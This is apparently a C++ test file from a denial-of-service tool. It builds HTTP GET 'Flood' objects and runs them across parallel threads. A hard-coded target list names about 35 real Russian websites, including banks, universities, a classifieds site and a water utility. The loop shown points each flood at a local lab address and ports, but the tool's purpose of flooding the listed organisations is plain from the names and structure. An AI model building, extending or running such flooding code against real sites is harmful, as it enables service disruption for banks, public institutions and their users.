#include "../include/tests_threadmaster.h"

static const string ip1 = "192.168.56.1";
static const int port1 = 65123;

static const vector<string> targets = {
  "www-dev.roseltorg.ru"
//, "www.торусдон.рф" // core dumped, I have to make it work
, "www.2gis.ru"
, "www.a-3.ru"
, "www.adygnet.ru"
, "www.ael.ru"
, "www.agatu.ru"
, "www.agroprombank.com"
, "www.akado.ru"
, "www.akibank.ru"
, "www.aktorstc.ru"
, "www.altspu.ru"
, "www.altstu.ru"
, "www.amchs.ru"
, "www.amgpgu.ru"
, "www.amursma.ru"
, "www.amursu.ru"
, "www.ap22.ru"
, "www.apkbank.ru"
, "www.arcticsu.ru"
, "www.asau.ru"
, "www.asberg.ru"
, "www.asmu.ru"
, "www.asu.ru"
, "www.audiomania.ru"
, "www.aumsu.ru"
, "www.avito.ru"
, "www.azov-vodokanal.ru"
, "www.bagsurb.ru"
, "www.balakovo-bank.ru"
, "www.bankfax.ru"
, "www.bankodrom.ru"
, "www.bankperm.ru"
, "www.bashedu.ru"
};

void test_parallelposix_startstop()
{
    cout << "test_parallelposix_startstop" << endl;
    

    unsigned int sleep_delay_10s = 10;
	//unsigned int sleep_delay_2s = 2000000;
    //unsigned int sleep_delay_001s = 1;
	
	
	//vector<Flood> floods;
	vector<Flood*> floodsPtrs;
    vector<Flood*>* pFloodsPtrs = &floodsPtrs;
	
    int n = 0;
    for(const string& s : targets)
	{
		cout << "making " << s << endl;
		Flood* flood = new GET(ip1, port1 + n++);
		//if(flood::State::READY == flood->getState())
		floodsPtrs.push_back(std::move(flood));
	}
	
	cout <<"size floods" << floodsPtrs.size() << endl;
	for(auto f : floodsPtrs)
		cout << f->getTarget()->getAddress() << endl;

    int n_threads = 2;
    ParallelPosix s(pFloodsPtrs, n_threads);
    
    cout << "ParallelPosix.getState() = " << s.getState() << endl;
    cout << "ParallelPosix.getType() = " << s.getType() << endl;
    
    cout << "ParallelPosix.start() = " << endl;    
    s.start();
    sleep(10);
    sleep(sleep_delay_10s);
    /*
     sleep(sleep_delay_10s);
    cout << "ParallelPosix.stop() = " << endl;
    s.stop(); sleep(sleep_delay_10s);
        
    cout << "ParallelPosix.start() = " << endl;
    s.start(); sleep(sleep_delay_10s);
    cout << "ParallelPosix.stop() = " << endl;
    s.stop(); sleep(sleep_delay_10s);

    cout << "---- Stopping floods " << endl; 
    for(auto flood : v)
        flood->disable();
 
    cout << "ParallelPosix.start() = " << endl;    
    s.start(); sleep(sleep_delay_10s);
    cout << "ParallelPosix.stop() = " << endl;
    s.stop(); sleep(sleep_delay_10s);

    cout << "++++ Strating floods " << endl; 
    for(auto flood : v)
        flood->enable();

    cout << "ParallelPosix.start() = " << endl;    
    s.start(); sleep(sleep_delay_10s);
    cout << "ParallelPosix.stop() = " << endl;
    s.stop(); sleep(sleep_delay_10s);
    
    cout << "ParallelPosix.start() = " << endl;    
    s.start(); sleep(sleep_delay_10s);
    cout << "ParallelPosix.stop() = " << endl;
    s.stop(); sleep(sleep_delay_10s);
    */

    for(auto f : floodsPtrs)
    {
        delete f;
    }
    pFloodsPtrs->clear();
    
    cout << "ok"<<endl;
}
